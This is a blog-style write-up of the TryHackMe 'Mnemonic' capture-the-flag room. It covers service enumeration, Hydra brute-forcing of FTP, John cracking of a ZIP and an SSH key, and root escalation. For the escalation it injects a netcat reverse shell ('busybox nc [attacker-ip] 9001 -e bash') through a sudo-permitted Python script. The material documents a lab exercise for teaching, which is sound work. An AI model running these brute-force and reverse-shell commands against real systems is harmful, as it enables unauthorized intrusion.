---
title: "Mnemonic"
date: 2025-03-29
image: /assets/img/tryhackme/Mnemonic/Mnemonic_image.jpg
description: Writeup of the TryHackMe-CTF Mnemonic
categories: [TryHackMe, Medium]
tags: [linux, crack, hydra, john, mnemonic, python]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Mnemonic</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>I hope you have fun.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Medium</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/mnemonic">https://tryhackme.com/room/mnemonic</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Mnemonic.  

## Enumeration
I started the enumeration using `nmap`:
```bash
kali@kali:~/ctf/relevant$ nmap -p- 10.10.48.189
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 15:19 EDT
  Nmap scan report for 10.10.48.189
  Host is up (0.040s latency).
  Not shown: 65532 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  21/tcp   open  ftp
  80/tcp   open  http
  1337/tcp open  waste

  Nmap done: 1 IP address (1 host up) scanned in 39.88 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
kali@kali:~/ctf/relevant$ nmap -A -p 21,80,1337 10.10.48.189
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-28 15:37 EDT
  Nmap scan report for 10.10.48.189
  Host is up (0.043s latency).

  PORT     STATE SERVICE VERSION
  21/tcp   open  ftp     vsftpd 3.0.3
  80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-robots.txt: 1 disallowed entry 
  |_/webmasters/*
  |_http-title: Site doesn't have a title (text/html).
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
  |   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
  |_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

The webserver displayed only the word 'Test', so I continued with a Gobuster directory enumeration:
```bash
kali@kali:~/ctf/mnemonic$ gobuster dir --url http://10.10.48.189/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php

  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.48.189/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 277]
  /.hta.txt             (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.hta.html            (Status: 403) [Size: 277]
  /.hta.php             (Status: 403) [Size: 277]
  /.htaccess.html       (Status: 403) [Size: 277]
  /.htaccess.txt        (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htpasswd.txt        (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.htpasswd.html       (Status: 403) [Size: 277]
  /.htaccess.php        (Status: 403) [Size: 277]
  /.htpasswd.php        (Status: 403) [Size: 277]
  /index.html           (Status: 200) [Size: 15]
  /index.html           (Status: 200) [Size: 15]
  /robots.txt           (Status: 200) [Size: 48]
  /robots.txt           (Status: 200) [Size: 48]
  /server-status        (Status: 403) [Size: 277]
  /webmasters           (Status: 301) [Size: 317] [--> http://10.10.48.189/webmasters/]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

The `robots.txt` file provided the same information as the Gobuster directory enumeration: 
```html
User-agent: *
Allow: / 
Disallow: /webmasters/*
```

I then proceeded with another Gobuster directory enumeration inside of the `/webmasters` directory:
```bash
kali@kali:~/ctf/mnemonic$ gobuster dir --url http://10.10.48.189/webmasters/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php

  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.48.189/webmasters/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,html,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 277]
  /.hta.txt             (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.hta.html            (Status: 403) [Size: 277]
  /.hta.php             (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.htaccess.txt        (Status: 403) [Size: 277]
  /.htaccess.php        (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.htaccess.html       (Status: 403) [Size: 277]
  /.htpasswd.txt        (Status: 403) [Size: 277]
  /.htpasswd.php        (Status: 403) [Size: 277]
  /.htpasswd.html       (Status: 403) [Size: 277]
  /admin                (Status: 301) [Size: 323] [--> http://10.10.48.189/webmasters/admin/]
  /backups              (Status: 301) [Size: 325] [--> http://10.10.48.189/webmasters/backups/]
  /index.html           (Status: 200) [Size: 0]
  /index.html           (Status: 200) [Size: 0]
  Progress: 18456 / 18460 (99.98%)
  ===============================================================
  Finished
  ===============================================================
```

The scan revealed a directory called `backups`, so before initiating the next enumeration, I added some backup typical extensions to the scan: 
```bash
kali@kali:~/ctf/mnemonic$ gobuster dir --url http://10.10.48.189/webmasters/backups/ --wordlist /usr/share/wordlists/dirb/common.txt -x txt,html,php,bak,zip,7z

  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://10.10.48.189/webmasters/backups/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              7z,txt,html,php,bak,zip
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 277]
  /.hta                 (Status: 403) [Size: 277]
  /.hta.html            (Status: 403) [Size: 277]
  /.hta.php             (Status: 403) [Size: 277]
  /.hta.bak             (Status: 403) [Size: 277]
  /.hta.zip             (Status: 403) [Size: 277]
  /.hta.7z              (Status: 403) [Size: 277]
  /.htaccess.txt        (Status: 403) [Size: 277]
  /.htaccess.php        (Status: 403) [Size: 277]
  /.htaccess.html       (Status: 403) [Size: 277]
  /.htaccess.7z         (Status: 403) [Size: 277]
  /.htaccess            (Status: 403) [Size: 277]
  /.hta.txt             (Status: 403) [Size: 277]
  /.htaccess.zip        (Status: 403) [Size: 277]
  /.htaccess.bak        (Status: 403) [Size: 277]
  /.htpasswd            (Status: 403) [Size: 277]
  /.htpasswd.7z         (Status: 403) [Size: 277]
  /.htpasswd.txt        (Status: 403) [Size: 277]
  /.htpasswd.php        (Status: 403) [Size: 277]
  /.htpasswd.bak        (Status: 403) [Size: 277]
  /.htpasswd.zip        (Status: 403) [Size: 277]
  /.htpasswd.html       (Status: 403) [Size: 277]
  /backups.zip          (Status: 200) [Size: 409]

===============================================================
Finished
===============================================================
```

I downloaded the ZIP file, but it was password protected, so I used `zip2john` to extract the password hash and crack it:
```bash
kali@kali:~/ctf/mnemonic$ zip2john backups.zip > ziphash
kali@kali:~/ctf/mnemonic$ john --wordlist=/usr/share/wordlists/rockyou.txt ziphash      
  Using default input encoding: UTF-8
  Loaded 1 password hash (PKZIP [32/64])
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  0[removed]7         (backups.zip/backups/note.txt)     
  1g 0:00:00:00 DONE (2025-03-28 15:11) 1.470g/s 20985Kp/s 20985Kc/s 20985KC/s 01/17/96..001905apekto
  Use the "--show" option to display all of the cracked passwords reliably
```

With the password, I was able to extract the ZIP archive and found the following note:
```bash
kali@kali:~/ctf/mnemonic/backups$ cat note.txt 
@vill

James new ftp username: [removed]
we have to work hard
```

## Port 21 Analysis

Due to the FTP hint, I switched to FTP. I had a username and attempted to brute-force the password, but the brute-forcing with Hydra took quite some time. Since, I knew from the number of stars in the flag that the password was nine characters long, I filtered the `rockyou.txt` accordingly:  
```bash
kali@kali:~/ctf/mnemonic/backups$ grep -E '^.{9}$' /usr/share/wordlists/rockyou.txt > passwdlist.txt
                                                                                                                                                                        
kali@kali:~/ctf/mnemonic/backups$ hydra -l 'ftpuser' -P passwdlist.txt  ftp://10.10.48.189 -V -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-28 15:16:51
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 2191587 login tries (l:1/p:2191587), ~73053 tries per task
[DATA] attacking ftp://10.10.48.189:21/
[...]
[21][ftp] host: 10.10.48.189   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-28 15:17:12
```

With the smaller wordlist, the brute-force took only a few seconds. After that, I successfully via FTP and analyzed the files:
```bash
ftp ftpuser@10.10.198.59
    Connected to 10.10.198.59.
    220 (vsFTPd 3.0.3)
    331 Please specify the password.
  Password: 
    230 Login successful.
  ftp> ls -al
    drwx------   12 1003     1003         4096 Jul 14  2020 .
    drwx------   12 1003     1003         4096 Jul 14  2020 ..
    lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
    -rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
    -rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
    -rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
    drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
    drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
    226 Directory send OK.
```

Since the directory `data-4` indicated it contained 4 files, I enumerated it:
```bash
ftp> ls -al
  drwxr-xr-x    4 0        0            4096 Jul 14  2020 .
  drwx------   12 1003     1003         4096 Jul 14  2020 ..
  drwxr-xr-x    2 0        0            4096 Jul 14  2020 3
  drwxr-xr-x    2 0        0            4096 Jul 14  2020 4
  -rwxr-xr-x    1 1001     1001         1766 Jul 13  2020 id_rsa
  -rwxr-xr-x    1 1000     1000           31 Jul 13  2020 not.txt
```

I downloaded the two files and analyzed them further:
```bash
kali@kali:~/ctf/mnemonic$ cat not.txt    
  james change ftp user password
                                                                                                                                                              
kali@kali:~/ctf/mnemonic$ cat id_rsa    
  -----BEGIN RSA PRIVATE KEY-----
  Proc-Type: 4,ENCRYPTED
  DEK-Info: AES-128-CBC,01762A15A5B935E96A1CF34704C79AC3

  pSxCqzRmFf4dcfdkVay0+fN88/GXwl3LXOS1WQrRV26wqXTE1+EaL5LrRtET8mPM
  [...]
```

The SSH key caught my attention, but it was encrypted, so I needed to decrypt it first using `ssh2john`:
```bash
kali@kali:~/ctf/mnemonic$ ssh2john id_rsa > hash
                                                                                                                                                            
kali@kali:~/ctf/mnemonic$ john --wordlist=/usr/share/wordlists/rockyou.txt hash    
  Using default input encoding: UTF-8
  Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
  Cost 2 (iteration count) is 1 for all loaded hashes
  Will run 8 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  b[removed]e         (id_rsa)     
  1g 0:00:00:00 DONE (2025-03-29 07:10) 25.00g/s 699200p/s 699200c/s 699200C/s chooch..ROSITA
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed.
```

The password cracking was successful, and I was able to log in via SSH as well:
```bash
kali@kali:~/ctf/mnemonic$ ssh -i id_rsa james@10.10.198.59 -p 1337

james@mnemonic:~$ id
uid=1001(james) gid=1001(james) groups=1001(james)
```

While enumerating the system, I found the following two interesting files:
```bash
james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

  @vill

  james i found a new encryption İmage based name is Mnemonic  

  I created the condor password. don't forget the beers on saturday


james@mnemonic:~$ cat 6450.txt
  5140656
  354528
  842004
  1617534
  465318
  1617534
  509634
  1152216
  753372
  265896
  265896
  15355494
  24617538
  3567438
  15355494
```

I started researching for `iamge base Mnemonic` and found this <a href="https://github.com/MustafaTanguner/Mnemonic">GitHub</a> repository. It was an encryption technique based on an image, which then creates an encrypted message containing numbers. Since I already had the encrypted message, I started searching for an image that I could likely use for the decryption. Because of the clue, `I created the condor password.`, I continued by  enumerating Condor's home directory:
```bash
james@mnemonic:~$ ls -al ../condor
  ls: cannot access '../condor/..': Permission denied
  ls: cannot access '../condor/'\''VEh[removed]Q=='\''': Permission denied
  ls: cannot access '../condor/.gnupg': Permission denied
  ls: cannot access '../condor/.bash_logout': Permission denied
  ls: cannot access '../condor/.bashrc': Permission denied
  ls: cannot access '../condor/.profile': Permission denied
  ls: cannot access '../condor/.cache': Permission denied
  ls: cannot access '../condor/.bash_history': Permission denied
  ls: cannot access '../condor/.': Permission denied
  ls: cannot access '../condor/aHR[removed]w==': Permission denied
  total 0
  d????????? ? ? ? ?            ?  .
  d????????? ? ? ? ?            ?  ..
  d????????? ? ? ? ?            ? 'aHR[removed]w=='
  l????????? ? ? ? ?            ?  .bash_history
  -????????? ? ? ? ?            ?  .bash_logout
  -????????? ? ? ? ?            ?  .bashrc
  d????????? ? ? ? ?            ?  .cache
  d????????? ? ? ? ?            ?  .gnupg
  -????????? ? ? ? ?            ?  .profile
  d????????? ? ? ? ?            ? ''\''VEh[removed]Q=='\'''
```

Two Base64-encoded strings caught my attention. After decoding them, I found the URL to an image and retrieved the user flag:
```bash
kali@kali:~/ctf/mnemonic$ echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
https://i.ytimg.com/vi/[removed]/[removed].jpg

kali@kali:~/ctf/mnemonic$ echo "VE[removed]Q==" | base64 -d                    
  THM{a[removed]1}
```

> While executing the Python script, I encountered the error `ValueError: Exceeds the limit (4300 digits) for integer`. I resolved this by adding `sys.set_int_max_str_digits(50000)` at the top.
{: .prompt-tip }

The image was likely the one I needed for decrypting the `6450.txt` file:
```bash
kali@kali:~/ctf/mnemonic$ python3 mnemonic.py                                                                            


ooo        ooooo                                                                o8o            
`88.       .888'                                                                `"'            
 888b     d'888  ooo. .oo.    .ooooo.  ooo. .oo.  .oo.    .ooooo.  ooo. .oo.   oooo   .ooooo.  
 8 Y88. .P  888  `888P"Y88b  d88' `88b `888P"Y88bP"Y88b  d88' `88b `888P"Y88b  `888  d88' `"Y8 
 8  `888'   888   888   888  888ooo888  888   888   888  888   888  888   888   888  888       
 8    Y     888   888   888  888    .o  888   888   888  888   888  888   888   888  888   .o8 
o8o        o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' o888o o888o o888o `Y8bod8P' 


******************************* Welcome to Mnemonic Encryption Software *********************************
*********************************************************************************************************
***************************************** Author:@villwocki *********************************************
*********************************************************************************************************
****************************** https://www.youtube.com/watch?v=pBSR3DyobIY ******************************
---------------------------------------------------------------------------------------------------------


Access Code image file Path:./maxresdefault.jpg
File exists and is readable


Processing:0.txt'dir.


*************** PROCESS COMPLETED ***************
Image Analysis Completed Successfully. Your Special Code:
[1804052473...0000000000]
                                                                                                                                                             
(1) ENCRYPT (2) DECRYPT                                                                                                                                      

>>>>2
ENCRYPT Message to file Path'

Please enter the file Path:6450.txt
  
p[removed]1
 
 
PRESS TO QUİT 'ENTER' OR 'E' PRESS TO CONTİNUE.
```

With the decrypted password, I was able to log in as `condor` via SSH:
```bash
kali@kali:~/ctf/mnemonic$ ssh condor@10.10.198.59 -p 1337
condor@mnemonic:~$ id
  uid=1002(condor) gid=1002(condor) groups=1002(condor)
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
condor@mnemonic:~$ sudo -l
[sudo] password for condor: 
  Matching Defaults entries for condor on mnemonic:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User condor may run the following commands on mnemonic:
      (ALL : ALL) /usr/bin/python3 /bin/examplecode.py

```

While analyzing the Python script for a privilege escalation opportunity, a particular code section caught my attention:
```python
condor@mnemonic:~$ cat /bin/examplecode.py
  [...]
  if select == 0: 
      time.sleep(1)
      ex = str(input("are you sure you want to quit ? yes : "))

      if ex == ".":
              print(os.system(input("\nRunning....")))
      if ex == "yes " or "y":
              sys.exit()
  [...]
```

The script allowed me to run any command after starting it, selecting 0 to exit and inserting `.`:
```bash
condor@mnemonic:~$ sudo /usr/bin/python3 /bin/examplecode.py

Select:0
are you sure you want to quit ? yes : .

Running....busybox nc [attacker-ip] 9001 -e bash
```

I was able to escalate my privileges using a reverse shell and successfully retrieved the root flag:
```bash
listening on [any] 9001 ...
connect to [attacker-ip] from (UNKNOWN) [10.10.8.8] 45618
id
  uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
  THM{c[removed]e}
```

After creating the MD5 hash of the content from the string I found in the `root.txt`, I was able to submit it.
```text
THM{c[removed]e} -> md5(c[removed]e) -> THM{2[removed]6}
```

solved! :)